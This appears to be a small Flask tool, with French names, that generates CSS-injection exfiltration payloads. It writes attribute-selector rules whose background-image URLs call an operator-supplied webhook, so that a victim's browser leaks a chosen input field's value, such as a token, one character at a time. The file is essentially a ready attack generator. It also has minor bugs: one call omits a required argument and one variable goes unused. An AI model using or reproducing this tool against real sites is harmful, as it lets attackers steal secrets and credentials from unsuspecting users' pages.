from flask import Flask, render_template, request
import string
import urllib.parse

alphabet = string.printable.strip()
app = Flask(__name__)
webhook = "" 
champ = ""

def payload(lettre, champ):
    encoded = urllib.parse.quote(lettre, safe='')
    return f"""
input[name="{champ}"][value ^="{lettre}"] {{
    background-image: url("{webhook}?c={lettre}");
}}
"""

def fuzz(lettres, champ):
    contenu = ""
    for i in alphabet:
        contenu += payload(lettres + i, champ)
    return contenu

@app.route("/", methods=["GET", "POST"])
def page():
    global webhook
    global champ
    lettres = ""
    css_exfil = ""

    if request.method == "POST":
        webhook = request.form.get("webhook", "").strip()
        lettres = request.form.get("lettres", "").strip()
        champ = request.form.get("Champ", "").strip()
        css_exfil = fuzz(lettres, champ) if lettres else fuzz("")

    return render_template("index.html", payload=css_exfil, lettres=lettres, webhook=webhook, champ=champ)

if __name__ == '__main__':
    app.run(debug=True)
